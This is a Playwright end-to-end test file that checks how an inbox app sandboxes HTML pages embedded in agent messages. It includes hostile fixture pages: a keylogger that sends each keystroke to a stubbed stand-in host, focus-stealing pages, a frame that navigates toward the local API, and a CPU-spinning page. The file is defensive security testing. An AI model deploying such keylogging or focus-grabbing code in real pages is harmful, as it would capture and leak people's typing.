/**
 * Live HTML in a message (approval "inbox-inline-html", 2026-10-28), proved
 * in a real browser against the compiled binary: `plannotator inbox
 * --background` under a temp PLANNOTATOR_DATA_DIR and HOME, an agent writing
 * through `plannotator inbox mcp` (scripts/inbox-sim.ts), the browser opening
 * the thread. No real network: the web the page loads from is stubbed with
 * `context.route`.
 *
 * What regresses if this fails:
 * - an agent's ```html fence no longer draws as a page (or ```mermaid stops
 *   drawing), or the page loses its sandbox;
 * - the page's requests reach the Inbox: any request from the embed's frame
 *   to either of the Inbox's loopback origins that leaves the browser, other
 *   than its own document (an absolute URL, a relative one, an image);
 * - the page can no longer load from the web over https (the owner's choice:
 *   "anything, like t3code's pages");
 * - the page takes the keyboard: the person's typing in the reply box reaches
 *   the page (which could send it over https), an Inbox shortcut is swallowed
 *   by a page that focused itself, or a page that keeps doing it is not
 *   stopped (Chromium and WebKit);
 * - in Chromium a busy page freezes the window (the frame is no longer served
 *   from the other loopback name, so it shares the window's process);
 * - a page that navigates its frame to the Inbox gets an answer other than a
 *   refusal (it cannot read it either way: the frame is sandboxed);
 * - a link the page hands over opens without the window showing its real
 *   address and the person clicking Open;
 * - the page paints its own background or the window's theme does not reach
 *   it (it would not look embedded), or it does not size to its content;
 * - Code, Full screen or Escape stop working; on a phone the page spills
 *   past the column.
 *
 * Build the binary first (see inbox.spec.ts), then `bun run test:e2e:inbox`.
 */

import { chromium, expect, test, type Browser, type BrowserContext, type Frame, type Page } from '@playwright/test';
import { spawnSync } from 'node:child_process';
import { existsSync, realpathSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { SimAgent, scratchProject } from '../../scripts/inbox-sim';
import { inboxScratch, removeInboxScratch } from './inbox-scratch';
import { NO_BROWSER } from '../helpers/no-browser';

const repo = resolve(__dirname, '../..');
const binary = resolve(process.env.PLANNOTATOR_E2E_BINARY ?? join(repo, '.local/plannotator'));

/** A stand-in for the web: never resolved, every request answered by `stubWeb`. */
const CDN = 'https://cdn.example.test';

/**
 * The agent's page: it loads a script and data from the web, then tries the
 * Inbox every way a page could, and writes what happened into itself.
 */
const PAGE = [
  '<style>p{margin:0 0 6px} #chart{height:160px;border-radius:6px;background:var(--chart-1)}</style>',
  `<script src="${CDN}/lib.js"></script>`,
  '<p id="lib">lib: pending</p><p id="cdn">cdn: pending</p><p id="inbox">inbox: pending</p><p id="relative">relative: pending</p><p id="img">img: pending</p>',
  '<div id="chart"></div>',
  `<p><a id="docs" href="${CDN}/docs">The docs</a></p>`,
  '<script>',
  "const say = (id, text) => { document.getElementById(id).textContent = id + ': ' + text; };",
  "say('lib', typeof window.LIB === 'string' ? window.LIB : 'missing');",
  `fetch('${CDN}/data.json').then((r) => r.json()).then((d) => say('cdn', d.ok ? 'ok' : 'bad'), () => say('cdn', 'blocked'));`,
  // The page's own address is on the Inbox (at its other loopback name): try it absolutely and relatively.
  "const inbox = new URL('/api/inbox/threads', location.href).href;",
  "fetch(inbox).then(() => say('inbox', 'reached'), () => say('inbox', 'blocked'));",
  "fetch('/api/inbox/health', { credentials: 'include' }).then(() => say('relative', 'reached'), () => say('relative', 'blocked'));",
  "const img = new Image(); img.onload = () => say('img', 'reached'); img.onerror = () => say('img', 'blocked'); img.src = '/api/inbox/health';",
  '</script>',
].join('\n');

/** A page that sends every key it gets to the web: what a thief would do with the keyboard. */
const keyLogger = (name: string) =>
  `document.addEventListener('keydown', (e) => { fetch('${CDN}/keys/${name}?k=' + encodeURIComponent(e.key)).catch(() => {}); });`;

/** Takes the keyboard every 30 ms, with no click. */
const THIEF = ['<input id="grab" aria-label="grab">', '<script>', keyLogger('thief'), "setInterval(() => { window.focus(); document.getElementById('grab').focus(); }, 30);", '</script>'].join('\n');

/** An innocent page with an autofocus input (Chromium refuses autofocus in another site's frame, so it focuses itself too). */
const AUTOFOCUS = ['<label>Filter <input id="q" autofocus></label>', '<script>', keyLogger('autofocus'), "document.getElementById('q').focus();", '</script>'].join('\n');

/** A page that takes the keyboard once every 2 seconds: alive long enough to race the person's typing. */
const SLOW_THIEF = ['<input id="grab" aria-label="grab">', '<script>', keyLogger('slow'), "setInterval(() => { document.getElementById('grab').focus(); }, 2000);", '</script>'].join('\n');

/** A page that steers its own frame at the Inbox. */
const WANDERER = "<p>leaving</p><script>setTimeout(() => { location.href = new URL('/api/inbox/threads?wander', location.href).href; }, 300);</script>";

/** A page that spins for five seconds. */
const BUSY = '<p id="busy">busy</p><script>setTimeout(() => { const end = Date.now() + 5000; while (Date.now() < end) {} }, 300);</script>';

async function stubWeb(context: BrowserContext): Promise<string[]> {
  const asked: string[] = [];
  await context.route(`${CDN}/**`, (route) => {
    const url = route.request().url();
    asked.push(url);
    if (url.endsWith('/lib.js')) return route.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.LIB = "loaded";' });
    if (url.endsWith('/data.json')) return route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: '{"ok":true}' });
    if (url.includes('/keys/')) return route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*' }, body: '' });
    return route.fulfill({ status: 200, contentType: 'text/html', body: '<title>docs</title>docs' });
  });
  return asked;
}

const fence = (html: string) => ['```html', html, '```'].join('\n');

interface World {
  url: string;
  /** The window's origin (http://localhost:<port>) and the embeds' (http://127.0.0.1:<port>). */
  windowOrigin: string;
  embedOrigin: string;
  agent: SimAgent;
  project: string;
  close(): Promise<void>;
}

async function startWorld(prefix: string): Promise<World> {
  expect(existsSync(binary), `build the binary first: ${binary}`).toBe(true);
  const scratch = inboxScratch(prefix);
  const root = realpathSync(scratch);
  const env = {
    PATH: process.env.PATH ?? '',
    HOME: root,
    PLANNOTATOR_DATA_DIR: join(root, 'data'),
    PLANNOTATOR_BROWSER: NO_BROWSER,
    PLANNOTATOR_INBOX_CONNECT: '0',
    PLANNOTATOR_UPDATE_CHECK: '0',
  };
  try {
    const started = spawnSync(binary, ['inbox', '--background'], { env, encoding: 'utf8', timeout: 60_000 });
    expect(started.status, started.stderr).toBe(0);
    const url = started.stdout.trim();
    const windowOrigin = new URL(url).origin;
    expect(new URL(url).hostname).toBe('localhost');
    const embedOrigin = `http://127.0.0.1:${new URL(url).port}`;
    const project = scratchProject(join(root, 'src'), 'docs');
    const agent = await SimAgent.connect({ binary, env, name: 'Claude Code', host: 'claude-code' });
    return {
      url,
      windowOrigin,
      embedOrigin,
      agent,
      project,
      close: async () => {
        await agent.close().catch(() => {});
        await removeInboxScratch(scratch);
      },
    };
  } catch (error) {
    await removeInboxScratch(scratch);
    throw error;
  }
}

/** The embed's frame in `scope`, once its page has run (`ready`: an element the page writes). */
async function embedFrame(page: Page, scope = page.locator('body'), ready = '#img', pending = 'img: pending'): Promise<Frame> {
  const handle = await scope.locator('iframe[data-html-embed-frame="inline"]').first().elementHandle();
  const frame = (await handle!.contentFrame())!;
  await expect(frame.locator(ready)).not.toHaveText(pending);
  return frame;
}

test('an html fence draws as a live, sandboxed page that loads from the web and never reaches the Inbox', async ({ browser, browserName }) => {
  // The network boundary is policy, the same in every engine; the request accounting below reads Chromium's reasons.
  test.skip(browserName !== 'chromium', 'Chromium: request failure reasons');
  const world = await startWorld('plannotator-inbox-inline-html-e2e-');
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const phone = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
  try {
    const web = await stubWeb(context);
    await stubWeb(phone);
    const sent = await world.agent.send({
      project_path: world.project,
      subject: 'Build time per deploy',
      body: ['The index adds 40 seconds to each build:', '', fence(PAGE), '', '```mermaid', 'flowchart LR', '  A --> B', '```'].join('\n'),
    });
    const page = await context.newPage();
    // Every request the page's frame sent to the Inbox (at either loopback name). Chromium reports a
    // load its policy stopped (reason `csp`) as a request that failed; that one never left the browser.
    const toInbox: string[] = [];
    const stoppedByPolicy: string[] = [];
    const inboxOrigins = [world.windowOrigin, world.embedOrigin];
    const fromFrame = (request: { frame(): Frame; url(): string }) =>
      request.frame() !== page.mainFrame() && inboxOrigins.some((origin) => request.url().startsWith(origin));
    page.on('request', (request) => {
      if (fromFrame(request)) toInbox.push(request.url());
    });
    page.on('requestfailed', (request) => {
      if (fromFrame(request) && request.failure()?.errorText === 'csp') stoppedByPolicy.push(request.url());
    });
    await page.goto(`${world.url}#thread=${sent.thread_id}`);
    const message = page.locator(`[data-message-id="${sent.message_id as string}"]`);

    // Diagrams still draw (Stage 0: agents are now told).
    await expect(message.locator('[data-block-id] svg').first()).toBeVisible();

    const iframe = message.locator('iframe[data-html-embed-frame="inline"]');
    await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts');
    const frame = await embedFrame(page, message);
    const documentUrl = frame.url();
    // Served from the other loopback name: another site, so its own process in Chromium.
    expect(documentUrl.startsWith(`${world.embedOrigin}/api/inbox/embeds/`)).toBe(true);

    // The web over https: allowed.
    await expect(frame.locator('#lib')).toHaveText('lib: loaded');
    await expect(frame.locator('#cdn')).toHaveText('cdn: ok');
    expect(web.some((asked) => asked.endsWith('/data.json'))).toBe(true);
    // The Inbox: never, however the page asks.
    await expect(frame.locator('#inbox')).toHaveText('inbox: blocked');
    await expect(frame.locator('#relative')).toHaveText('relative: blocked');
    await expect(frame.locator('#img')).toHaveText('img: blocked');
    const leftTheBrowser = toInbox.filter((asked) => !stoppedByPolicy.includes(asked));
    expect(leftTheBrowser.map((asked) => asked.split('#')[0])).toEqual([documentUrl.split('#')[0]]);
    // An opaque origin.
    expect(await frame.evaluate(() => self.origin)).toBe('null');

    // It looks embedded: no background of its own, the window's theme and color-scheme, sized to its content.
    const look = await frame.evaluate(() => ({
      background: getComputedStyle(document.body).backgroundColor,
      htmlBackground: getComputedStyle(document.documentElement).backgroundColor,
      foreground: getComputedStyle(document.documentElement).getPropertyValue('--foreground').trim(),
      scheme: document.documentElement.style.colorScheme,
      height: Math.ceil(document.documentElement.getBoundingClientRect().height),
    }));
    expect(look.background).toBe('rgba(0, 0, 0, 0)');
    expect(look.htmlBackground).toBe('rgba(0, 0, 0, 0)');
    const windowForeground = await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--foreground').trim());
    expect(look.foreground).toBe(windowForeground);
    expect(await iframe.evaluate((el: HTMLIFrameElement) => el.style.colorScheme)).toBe(look.scheme);
    await expect.poll(() => iframe.evaluate((el: HTMLIFrameElement) => el.getBoundingClientRect().height)).toBe(look.height);

    // A link the person clicks: the window shows its real address; it opens on the person's Open.
    const embed = message.locator('[data-html-embed]');
    await frame.locator('#docs').click();
    await expect(embed.locator('[data-html-embed-link-url]')).toHaveText(`${CDN}/docs`);
    expect(context.pages()).toHaveLength(1);
    const opened = context.waitForEvent('page');
    await embed.locator('[data-html-embed-link-open]').click();
    expect((await opened).url()).toBe(`${CDN}/docs`);
    await expect(embed.locator('[data-html-embed-link]')).toHaveCount(0);

    // Code shows the source; again, the page.
    await embed.locator('[data-html-embed-code]').click();
    await expect(iframe).toHaveCount(0);
    await expect(embed).toContainText('cdn.example.test/lib.js');
    await embed.locator('[data-html-embed-code]').click();
    await expect(iframe).toHaveCount(1);

    // Full screen: the same page, large; Escape closes it and the thread stays open.
    await embed.locator('[data-html-embed-full]').click();
    const popout = page.locator('[data-html-embed-popout]');
    await expect(popout.locator('iframe[data-html-embed-frame="full"]')).toHaveAttribute('sandbox', 'allow-scripts');
    await page.keyboard.press('Escape');
    await expect(popout).toHaveCount(0);
    await expect(message).toBeVisible();

    // A phone: the page fits the column.
    const small = await phone.newPage();
    await small.goto(`${world.url}#thread=${sent.thread_id}`);
    const smallFrame = small.locator('iframe[data-html-embed-frame="inline"]');
    await expect(smallFrame).toHaveAttribute('sandbox', 'allow-scripts');
    await embedFrame(small);
    const box = await smallFrame.boundingBox();
    expect(box!.x).toBeGreaterThanOrEqual(0);
    expect(box!.x + box!.width).toBeLessThanOrEqual(390);
  } finally {
    await context.close().catch(() => {});
    await phone.close().catch(() => {});
    await world.close();
  }
});

/** Open a thread whose message holds `html`, with the web stubbed. */
async function openThread(browser: Browser, world: World, subject: string, html: string) {
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const web = await stubWeb(context);
  // Its own thread (a session's messages otherwise join its open thread, and a reply draft with it).
  const sent = await world.agent.send({ project_path: world.project, thread: subject, subject, body: ['A page:', '', fence(html)].join('\n') });
  const page = await context.newPage();
  await page.goto(`${world.url}#thread=${sent.thread_id}`);
  const message = page.locator(`[data-message-id="${sent.message_id as string}"]`);
  return { context, web, page, message, keysAt: (name: string) => web.filter((asked) => asked.includes(`/keys/${name}`)) };
}

const replyBox = (page: Page) => page.getByRole('textbox', { name: /^Reply to/ });
async function openReply(page: Page) {
  const reply = page.locator('section.ib-pane .ib-pfoot').getByRole('button', { name: 'Reply', exact: true });
  // The foot shows Reply, or the box itself when it is open already.
  await expect(reply.or(replyBox(page))).toBeVisible();
  if (await reply.isVisible()) await reply.click();
  await expect(replyBox(page)).toBeVisible();
}

test('a page that takes the keyboard never gets the person’s typing, and one that keeps taking it is stopped', async ({ browser, browserName }) => {
  // WebKit lets another site's frame take focus only in some states (here it never got it once the
  // person was in the window), so a grab, and the stop it leads to, is certain in Chromium only.
  // Both engines must keep every key in the reply box.
  const grabsCertain = browserName === 'chromium';
  const world = await startWorld('plannotator-inbox-inline-html-focus-e2e-');
  try {
    // Every 30 ms, from the moment it loads: each grab is taken back, then the page is stopped.
    const thief = await openThread(browser, world, 'A page that grabs', THIEF);
    try {
      await expect(thief.message.locator('iframe[data-html-embed-frame="inline"], [data-html-embed-grabbed]').first()).toBeVisible();
      await openReply(thief.page);
      await replyBox(thief.page).click();
      await thief.page.keyboard.type('secret words', { delay: 40 });
      await expect(replyBox(thief.page)).toHaveValue('secret words');
      expect(thief.keysAt('thief')).toEqual([]);
      if (grabsCertain) {
        await expect(thief.message.locator('[data-html-embed-grabbed]')).toContainText('kept taking the keyboard');
        await expect(thief.message.locator('iframe[data-html-embed-frame]')).toHaveCount(0);
      }
    } finally {
      await thief.context.close().catch(() => {});
    }

    // Every 2 s: alive while the person types; each grab is taken back before a key lands.
    const slow = await openThread(browser, world, 'A page that grabs now and then', SLOW_THIEF);
    try {
      await expect(slow.message.locator('iframe[data-html-embed-frame="inline"]')).toHaveCount(1);
      await openReply(slow.page);
      await replyBox(slow.page).click();
      await slow.page.keyboard.type('secret words, typed slowly across a grab', { delay: 120 });
      await expect(replyBox(slow.page)).toHaveValue('secret words, typed slowly across a grab');
      expect(slow.keysAt('slow')).toEqual([]);
      if (grabsCertain) await expect(slow.page.locator('[data-html-embed-grabbed]')).toHaveCount(1);
    } finally {
      await slow.context.close().catch(() => {});
    }

    // An innocent autofocus input: focus comes back to the window at once, so an Inbox shortcut works.
    const quiet = await openThread(browser, world, 'A page with a filter box', AUTOFOCUS);
    try {
      await expect(quiet.message.locator('iframe[data-html-embed-frame="inline"]')).toHaveCount(1);
      await embedFrame(quiet.page, quiet.message, '#q', 'never');
      await expect.poll(() => quiet.page.evaluate(() => document.activeElement?.tagName)).not.toBe('IFRAME');
      await quiet.page.keyboard.press('ControlOrMeta+K');
      await expect(quiet.page.locator('dialog[data-search-palette]')).toBeVisible();
      await quiet.page.keyboard.press('Escape');
      // One grab is not a page that keeps grabbing: it stays.
      await expect(quiet.message.locator('iframe[data-html-embed-frame="inline"]')).toHaveCount(1);
      expect(quiet.keysAt('autofocus')).toEqual([]);
      // The person clicks into it (not mid-typing): theirs to type in.
      await quiet.page.waitForTimeout(800);
      const frame = await embedFrame(quiet.page, quiet.message, '#q', 'never');
      await frame.locator('#q').click();
      await quiet.page.keyboard.type('ab');
      await expect(frame.locator('#q')).toHaveValue('ab');
    } finally {
      await quiet.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('a page that steers its frame at the Inbox is refused', async ({ browser }) => {
  const world = await startWorld('plannotator-inbox-inline-html-nav-e2e-');
  try {
    const opened = await openThread(browser, world, 'A page that wanders', WANDERER);
    try {
      const answered = opened.page.waitForResponse((response) => response.url().includes('/api/inbox/threads?wander'));
      expect((await answered).status()).toBe(403);
      await expect(opened.message.locator('[data-html-embed-left]')).toContainText('went to another address');
    } finally {
      await opened.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('Chromium: a busy page does not freeze the window', async ({ browserName }) => {
  // WebKit runs every frame in the window's process: a busy page there still stalls the window (documented).
  test.skip(browserName !== 'chromium', 'Chromium isolates another site in its own process');
  // A Chromium that isolates sites but not sandboxed frames (Chrome without IsolateSandboxedIframes,
  // as on Android): a frame on the window's own origin shares its process; one on the other
  // loopback name does not. Playwright's headless shell isolates neither, desktop Chrome both.
  const isolating = await chromium.launch({ headless: true, args: ['--site-per-process', '--disable-features=IsolateSandboxedIframes'] });
  const world = await startWorld('plannotator-inbox-inline-html-busy-e2e-');
  try {
    const opened = await openThread(isolating, world, 'A busy page', BUSY);
    try {
      const frame = await embedFrame(opened.page, opened.message, '#busy', 'never');
      expect(frame.url().startsWith(`${world.embedOrigin}/`)).toBe(true);
      // The page spins from 300 ms after it ran, for 5 s: its own frame is stuck meanwhile, the window is not.
      await opened.page.waitForTimeout(600);
      const frameStarted = Date.now();
      const frameAnswered = frame.evaluate(() => 1).then(() => Date.now() - frameStarted);
      const windowTimes: number[] = [];
      for (let i = 0; i < 6; i += 1) {
        const started = Date.now();
        await opened.page.evaluate(() => document.title);
        windowTimes.push(Date.now() - started);
        await opened.page.waitForTimeout(250);
      }
      expect(await frameAnswered).toBeGreaterThan(2000);
      expect(Math.max(...windowTimes)).toBeLessThan(1000);
    } finally {
      await opened.context.close().catch(() => {});
    }
  } finally {
    await world.close();
    await isolating.close();
  }
});
